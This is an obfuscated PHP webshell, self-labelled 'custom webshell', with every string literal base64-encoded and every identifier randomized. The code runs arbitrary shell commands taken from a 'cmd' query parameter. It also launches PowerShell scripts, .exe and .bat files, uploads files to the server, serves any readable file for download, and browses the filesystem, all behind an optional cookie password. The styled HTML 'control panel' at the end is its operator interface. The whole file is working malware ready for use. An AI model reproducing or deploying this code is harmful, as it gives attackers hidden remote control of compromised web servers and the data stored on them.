<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->


<?php         $te1a1dc91c9073=''; 
        global $ci868d3cb40d27;
        global $hw020b759adef6;
    if($te1a1dc91c9073 != null) {
        if (isset($_COOKIE[base64_decode('cGFzcw==')])) {                         if (hash(base64_decode('c2hhNTEy'), $_COOKIE[base64_decode('cGFzcw==')]) !== $te1a1dc91c9073) {
                echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
                exit;
            }
        } else {
            echo base64_decode('V3JvbmcgcGFzc3dvcmQgIQ==');
            exit;
        }
    }

    function Blockb8d6a01b(string $jad6fe1d0be634): string
    {
                $jad6fe1d0be634 = mb_ereg_replace(base64_decode('XFxcXHwv'), base64_decode('Lw=='), $jad6fe1d0be634, base64_decode('bXNy'));
                $pe3ff401a37a03 = $jad6fe1d0be634[0] === base64_decode('Lw==');
                preg_match(base64_decode('L15bYS16XTov'), $jad6fe1d0be634, $mr9c28d32df234);
        $gz3ecab05b5b83 = isset($mr9c28d32df234[0]) ? $mr9c28d32df234[0] : false;
                $lyb6a8e8682249 = array_filter(explode(base64_decode('Lw=='), $jad6fe1d0be634), base64_decode('bWJfc3RybGVu'));

        $ku81406cf89f2a = [];
        foreach ($lyb6a8e8682249 as $vg1634b7ef7a71) {
            if (base64_decode('Lg==') === $vg1634b7ef7a71) {
                continue;
            }
                                                            if (base64_decode('Li4=') === $vg1634b7ef7a71
                && !$pe3ff401a37a03
                && !$gz3ecab05b5b83
                && empty(array_filter($ku81406cf89f2a, function ($nn2063c1608d6e) { return !(base64_decode('Li4=') === $nn2063c1608d6e); }))
            ) {
                $ku81406cf89f2a[] = $vg1634b7ef7a71;
                continue;
            }
            if (base64_decode('Li4=') === $vg1634b7ef7a71) {
                array_pop($ku81406cf89f2a);
                continue;
            }
            $ku81406cf89f2a[] = $vg1634b7ef7a71;
        }

        return
            (($pe3ff401a37a03 ? base64_decode('Lw==') : $gz3ecab05b5b83) ?
                $gz3ecab05b5b83.base64_decode('Lw==') : ''
            ).implode(base64_decode('Lw=='), $ku81406cf89f2a);
    }

        if (isset($_POST[base64_decode('dXBsb2Fk')])) {
        $mk14402cfaa308 = Seef35b6dfa();
        $yk87f85f26c826 = $mk14402cfaa308.base64_decode('Lw==').basename($_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')]);

        if (file_exists($yk87f85f26c826)) {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IEZpbGUgYWxyZWFkeSBleGlzdHMgIScpPC9zY3JpcHQ+');
        }
        else if (move_uploaded_file($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')], $yk87f85f26c826)) {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVseSAhJyk8L3NjcmlwdD4=');
        } else {
            echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCB1cGxvYWQgZmlsZSAhJyk8L3NjcmlwdD4=');
        }
    
    }
    else if (isset($_GET[base64_decode('cnVuc2NyaXB0')])) {
        $li3205c0ded576 = $_GET[base64_decode('cnVuc2NyaXB0')];
        $lp0d858590b275 = Blockb8d6a01b($li3205c0ded576);
        $oz1dccadfed7bc = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1GaWxlICI=') . $lp0d858590b275 . base64_decode('Ig==');
        global $ci868d3cb40d27;
        global $hw020b759adef6;
        $ci868d3cb40d27 = shell_exec($oz1dccadfed7bc);
    }
    else if (isset($_GET[base64_decode('cnVuZXhl')])) {
        $li3205c0ded576 = $_GET[base64_decode('cnVuZXhl')];
        $lp0d858590b275 = Blockb8d6a01b($li3205c0ded576);
        $oz1dccadfed7bc = $lp0d858590b275;
        exec(base64_decode('Y2Qg').realpath(Seef35b6dfa()).base64_decode('ICYmIA==').$lp0d858590b275, $ci868d3cb40d27, $hw020b759adef6);
    }
    else if (isset($_GET[base64_decode('cnVuYmF0')])) {
        $li3205c0ded576 = $_GET[base64_decode('cnVuYmF0')];
        $lp0d858590b275 = Blockb8d6a01b($li3205c0ded576);
        $oz1dccadfed7bc = base64_decode('cHdzaCAtTm9uaSAtTm9wIC1Db21tYW5kIHsgU3RhcnQtUHJvY2VzcyAiY21kLmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCIvayIsIg==') . $lp0d858590b275 . base64_decode('KSB9');
        exec(base64_decode('Y2Qg').realpath(Seef35b6dfa()).base64_decode('ICYmIA==').$lp0d858590b275, $ci868d3cb40d27, $hw020b759adef6);
    }
    
        if (isset($_GET[base64_decode('ZG93bmxvYWQ=')])) {
        $cz8c7dd922ad47 = $_GET[base64_decode('ZG93bmxvYWQ=')];
        if (file_exists($cz8c7dd922ad47)) {
            if (is_readable($cz8c7dd922ad47)) {
                header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));
                header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));
                header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==').basename($cz8c7dd922ad47).base64_decode('Ig=='));
                header(base64_decode('RXhwaXJlczogMA=='));
                header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRl'));
                header(base64_decode('UHJhZ21hOiBwdWJsaWM='));
                header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($cz8c7dd922ad47));
                readfile($cz8c7dd922ad47);
                exit;
            } else {
                echo base64_decode('PHNjcmlwdD5hbGVydCgnRXJyb3I6IENvdWxkIG5vdCByZWFkIHRoZSBmaWxlICEnKTwvc2NyaXB0Pg==');
                exit;
            }
        }
    }

    function Saveb73264b0(){
        return base64_decode('cmdiKDMyLCAwLCAxMjgp');
    }
    function Pine02270f8(){
        return base64_decode('IzAwZmYwMA==');
    }
    function Sit8ec5a7cc(){
        return base64_decode('I2Q5MjYyNg==');
    }
    function Imply6364d614(){
        return base64_decode('I2ZmMDA2Ng==');
    }
    function Race0f3f7b91(){
        return base64_decode('IzNBREYwMA==');
    }
    function Split0f10869d(){
        return base64_decode('IzNBREYwMA==');
    }
    function Seef35b6dfaectoryColor(){
        return base64_decode('IzNBREYwMA==');
    }
    function Protect1fcc8041(){
        return base64_decode('I2ZmNTUwMA==');
    }
    function Foota91ce237(){
        return base64_decode('I0MwQzBDMA==');
    }
    function Gapd89b8969(){
        return base64_decode('I0MwQzBDMA==');
    }
    function Concern56d0bbe0(){
        return base64_decode('IzNBREYwMA==');
    }
    function Investda6c5a75($wyc9e9a8489208){
        switch ($wyc9e9a8489208) {
          case 1:
            return base64_decode('IzEwMTAxMA==');
            break;
          case 2:
            return base64_decode('IzIwMjAyMA==');
            break;
          case 3:
            return base64_decode('IzMwMzAzMA==');
            break;
          case 4:
            return base64_decode('IzQwNDA0MA==');
            break;
          default:
            return base64_decode('IzQwNDA0MA==');
        }
        return base64_decode('IzQwNDA0MA==');
    }
    function Tourfc889b02($bbb068931cc450) {
        $ma7b8b965ad4bc = strrpos($bbb068931cc450, base64_decode('Lg=='));
        return ($ma7b8b965ad4bc === false) ? '' : substr($bbb068931cc450, $ma7b8b965ad4bc+1);
    }
    function Contain30bee568($ue435ed7e9f07f) {
        $hw020b759adef6 =  '';
        $zka3da707b651c = Seef35b6dfa().base64_decode('Lw==').$ue435ed7e9f07f;
        if (is_dir($zka3da707b651c)){  
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Seef35b6dfaectoryColor() . base64_decode('Ij4=');
            $hw020b759adef6 .= htmlspecialchars(base64_decode('PGRpcj4='));
        }
        else{
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Sit8ec5a7cc() . base64_decode('Ij4=');
            $me93d565f07a1e = Describe310922a7(filesize($zka3da707b651c));
            $hw020b759adef6 .= $me93d565f07a1e;
        }
        $hw020b759adef6 .= base64_decode('PC90ZD4=');
        return $hw020b759adef6;
    }
    function Traffic0c65888e($ue435ed7e9f07f) {
        $hw020b759adef6 =  '';
        $wiabf77184f554 = pathinfo($ue435ed7e9f07f, PATHINFO_EXTENSION);
        switch ($wiabf77184f554) {
          case base64_decode('cHMx'):
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Sit8ec5a7cc() . base64_decode('Ij4=');
            $hw020b759adef6 .= Bother9b7fc7bd($ue435ed7e9f07f);
            break;
          case base64_decode('YmF0'):
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Sit8ec5a7cc() . base64_decode('Ij4=');
            $hw020b759adef6 .= Invitead059d24($ue435ed7e9f07f);
            break;
          case base64_decode('ZXhl'):
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Sit8ec5a7cc() . base64_decode('Ij4=');
            $hw020b759adef6 .= Intervieweb8c559b($ue435ed7e9f07f);
            break;
          default:
            $hw020b759adef6 .=  base64_decode('PHRkIHN0eWxlPSJjb2xvcjogIg==') .  Sit8ec5a7cc() . base64_decode('Ij4=');
            $hw020b759adef6 .= htmlspecialchars(base64_decode('bm9vcA=='));
        }
        $hw020b759adef6 .= base64_decode('PC90ZD4=');
        return $hw020b759adef6;
    }
    function Wasa2898916($cz8c7dd922ad47) {
        $nu15d61712450a = fileperms($cz8c7dd922ad47);
        if( $nu15d61712450a & 0x1000 ) { $qq599dcce2998a=base64_decode('cA=='); }
        else if( $nu15d61712450a & 0x2000 ) { $qq599dcce2998a=base64_decode('Yw=='); }
        else if( $nu15d61712450a & 0x4000 ) { $qq599dcce2998a=base64_decode('ZA=='); }
        else if( $nu15d61712450a & 0x6000 ) { $qq599dcce2998a=base64_decode('Yg=='); }
        else if( $nu15d61712450a & 0x8000 ) { $qq599dcce2998a=base64_decode('LQ=='); }
        else if( $nu15d61712450a & 0xA000 ) { $qq599dcce2998a=base64_decode('bA=='); }
        else if( $nu15d61712450a & 0xC000 ) { $qq599dcce2998a=base64_decode('cw=='); }
        else $qq599dcce2998a=base64_decode('dQ==');
        $ut72122ce96bfe[base64_decode('cmVhZA==')] = ($nu15d61712450a & 00400) ? base64_decode('cg==') : base64_decode('LQ==');
        $ut72122ce96bfe[base64_decode('d3JpdGU=')] = ($nu15d61712450a & 00200) ? base64_decode('dw==') : base64_decode('LQ==');
        $ut72122ce96bfe[base64_decode('ZXhlY3V0ZQ==')] = ($nu15d61712450a & 00100) ? base64_decode('eA==') : base64_decode('LQ==');
        $nqdb0f6f37ebeb[base64_decode('cmVhZA==')] = ($nu15d61712450a & 00040) ? base64_decode('cg==') : base64_decode('LQ==');
        $nqdb0f6f37ebeb[base64_decode('d3JpdGU=')] = ($nu15d61712450a & 00020) ? base64_decode('dw==') : base64_decode('LQ==');
        $nqdb0f6f37ebeb[base64_decode('ZXhlY3V0ZQ==')] = ($nu15d61712450a & 00010) ? base64_decode('eA==') : base64_decode('LQ==');
        $qr7d793037a076[base64_decode('cmVhZA==')] = ($nu15d61712450a & 00004) ? base64_decode('cg==') : base64_decode('LQ==');
        $qr7d793037a076[base64_decode('d3JpdGU=')] = ($nu15d61712450a & 00002) ? base64_decode('dw==') : base64_decode('LQ==');
        $qr7d793037a076[base64_decode('ZXhlY3V0ZQ==')] = ($nu15d61712450a & 00001) ? base64_decode('eA==') : base64_decode('LQ==');
        if( $nu15d61712450a & 0x800 ) $ut72122ce96bfe[base64_decode('ZXhlY3V0ZQ==')] = ($ut72122ce96bfe[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
        if( $nu15d61712450a & 0x400 ) $nqdb0f6f37ebeb[base64_decode('ZXhlY3V0ZQ==')] = ($nqdb0f6f37ebeb[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('cw==') : base64_decode('Uw==');
        if( $nu15d61712450a & 0x200 ) $qr7d793037a076[base64_decode('ZXhlY3V0ZQ==')] = ($qr7d793037a076[base64_decode('ZXhlY3V0ZQ==')]==base64_decode('eA==')) ? base64_decode('dA==') : base64_decode('VA==');
        $fe03c7c0ace395=sprintf(base64_decode('JTFz'), $qq599dcce2998a);
        $fe03c7c0ace395.=sprintf(base64_decode('JTFzJTFzJTFz'), $ut72122ce96bfe[base64_decode('cmVhZA==')], $ut72122ce96bfe[base64_decode('d3JpdGU=')], $ut72122ce96bfe[base64_decode('ZXhlY3V0ZQ==')]);
        $fe03c7c0ace395.=sprintf(base64_decode('JTFzJTFzJTFz'), $nqdb0f6f37ebeb[base64_decode('cmVhZA==')], $nqdb0f6f37ebeb[base64_decode('d3JpdGU=')], $nqdb0f6f37ebeb[base64_decode('ZXhlY3V0ZQ==')]);
        $fe03c7c0ace395.=sprintf(base64_decode('JTFzJTFzJTFz'), $qr7d793037a076[base64_decode('cmVhZA==')], $qr7d793037a076[base64_decode('d3JpdGU=')], $qr7d793037a076[base64_decode('ZXhlY3V0ZQ==')]);
        return $fe03c7c0ace395;
    }

    function Describe310922a7($xj4b3a6218bb3e) {
        if ($xj4b3a6218bb3e >= 1073741824)
        {
            $xj4b3a6218bb3e = number_format($xj4b3a6218bb3e / 1073741824, 2) . base64_decode('IEdC');
        }
        elseif ($xj4b3a6218bb3e >= 1048576)
        {
            $xj4b3a6218bb3e = number_format($xj4b3a6218bb3e / 1048576, 2) . base64_decode('IE1C');
        }
        elseif ($xj4b3a6218bb3e >= 1024)
        {
            $xj4b3a6218bb3e = number_format($xj4b3a6218bb3e / 1024, 2) . base64_decode('IEtC');
        }
        elseif ($xj4b3a6218bb3e > 1)
        {
            $xj4b3a6218bb3e = $xj4b3a6218bb3e . base64_decode('IGJ5dGVz');
        }
        elseif ($xj4b3a6218bb3e == 1)
        {
            $xj4b3a6218bb3e = $xj4b3a6218bb3e . base64_decode('IGJ5dGU=');
        }
        else
        {
            $xj4b3a6218bb3e = base64_decode('MCBieXRlcw==');
        }

        return $xj4b3a6218bb3e;
    }


    function Seef35b6dfa() {
        return isset($_GET[base64_decode('ZGly')]) ? realpath($_GET[base64_decode('ZGly')]) : getcwd();
    }


    function Hold6a4f71f1($cz8c7dd922ad47) {
        if (is_dir(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47)) {
            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rpcj0=').realpath(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47).base64_decode('Ij4=').$cz8c7dd922ad47.base64_decode('PC9hPg==');
        } else {
            return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P2Rvd25sb2FkPQ==').realpath(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47).base64_decode('Ij4=').$cz8c7dd922ad47.base64_decode('PC9hPg==');
        }
    }
    function Bother9b7fc7bd($cz8c7dd922ad47) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bnNjcmlwdD0=').Blockb8d6a01b(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47).base64_decode('JmRpcj0=').realpath(Seef35b6dfa()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function Intervieweb8c559b($cz8c7dd922ad47) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmV4ZT0=').Blockb8d6a01b(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47).base64_decode('JmRpcj0=').realpath(Seef35b6dfa()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function Invitead059d24($cz8c7dd922ad47) {
        return base64_decode('PGEgaHJlZj0i').$_SERVER[base64_decode('UEhQX1NFTEY=')].base64_decode('P3J1bmJhdD0=').Blockb8d6a01b(Seef35b6dfa().base64_decode('Lw==').$cz8c7dd922ad47).base64_decode('JmRpcj0=').realpath(Seef35b6dfa()) . base64_decode('Ij4=').base64_decode('cnVuPC9hPg==');
    }
    function Accessd6bd1a84() {
        $ql45b963397aa4 = scandir(Seef35b6dfa());

        $nvcc935c5faf4c = true;
        if ($ql45b963397aa4 != null) {
            foreach($ql45b963397aa4 as $ue435ed7e9f07f){
                                echo base64_decode('PHRyIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOg==').($nvcc935c5faf4c  ? base64_decode('IzUxNTE1MQ==') : base64_decode('IzIxMjEyMQ==')).base64_decode('OyI+');
                echo base64_decode('PHRkIHN0eWxlPSJmb250LXdlaWdodDp0aGluOyI+').Hold6a4f71f1($ue435ed7e9f07f).base64_decode('PC90ZD4='); 
                                                echo ''.Contain30bee568($ue435ed7e9f07f).'';
                echo ''.Traffic0c65888e($ue435ed7e9f07f).'';
                echo base64_decode('PC90cj4=');
                $nvcc935c5faf4c = !$nvcc935c5faf4c;
            }
        } else {
            echo base64_decode('PHA+Q291bGRuJ3Qgb3BlbiB0aGF0IGRpcmVjdG9yeSAh');
        }
    }

    function Feed1f7fb41b() {
        global $ci868d3cb40d27;
        global $hw020b759adef6;
        
        if ($hw020b759adef6 == 0 ) {
            if($ci868d3cb40d27 != null){
                foreach ($ci868d3cb40d27 as $sg6438c669e0d0) {

                    if($sg6438c669e0d0 != null){
                        echo base64_decode('PGJyPg==');
                        echo htmlspecialchars($sg6438c669e0d0);
                        echo base64_decode('Cg==');
                        
                    }
                }
            }
        } else {
            echo base64_decode('RXhlY3V0aW9uIGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IA==').$hw020b759adef6;
        }    
    }

    function Spraya2620970() {
        $cx0897acf49c7c = gethostname() ?? base64_decode('bm9uZQ==');
        $va14c4b06b824e = get_current_user();
        $qn736007832d21 = Seef35b6dfa();
        $fwdfff0a7fa1a5 = isset($_GET[base64_decode('Y21k')]) ? $_GET[base64_decode('Y21k')] : '';

        return base64_decode('PHNwYW4gc3R5bGU9ImNvbG9yOiAjZmY2MzQ3Ij4=').$va14c4b06b824e.base64_decode('QA==').$cx0897acf49c7c.base64_decode('PC9zcGFuPjogPHNwYW4gc3R5bGU9ImNvbG9yOiAjQjQwNDA0Ij4=').$qn736007832d21.base64_decode('PC9zcGFuPiQg').$fwdfff0a7fa1a5;
    }

    if (isset($_GET[base64_decode('Y21k')])) {
        exec(base64_decode('Y2Qg').realpath(Seef35b6dfa()).base64_decode('ICYmIA==').$_GET[base64_decode('Y21k')], $ci868d3cb40d27, $hw020b759adef6);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Implementd548f062() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Saveb73264b0();?>;
                --background-color-1: <?php echo Investda6c5a75(1);?>;
                --background-color-2: <?php echo Investda6c5a75(2);?>;
                --background-color-3: <?php echo Investda6c5a75(3);?>;
                --background-color-4: <?php echo Investda6c5a75(4);?>;
                --primary-color: <?php echo Pine02270f8();?>;
                --secondary-color: <?php echo Sit8ec5a7cc();?>;
                --command-color: <?php echo Imply6364d614();?>;
                --commandoutput-color: <?php echo Race0f3f7b91();?>;
                --explorer-color: <?php echo Split0f10869d();?>;
                --directory-color: <?php echo Seef35b6dfaectoryColor();?>;
                --navtext-color: <?php echo Protect1fcc8041();?>;
                --navtext-hover-color: <?php echo Gapd89b8969();?>;
                --header-text-color: <?php echo Foota91ce237();?>;
                --buttons-color: <?php echo Concern56d0bbe0();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Seef35b6dfa()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Kill0b94f518()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Seef35b6dfa()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Kill0b94f518()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Exposeb90ad725() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Catch4bd47d0d() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Kill0b94f518() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="Exposeb90ad725()">[upload]</a>
                    <a onclick="Implementd548f062()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Seef35b6dfa()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Accessd6bd1a84()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Spraya2620970()?></p>
                    <p><?php Feed1f7fb41b()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Seef35b6dfa()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>




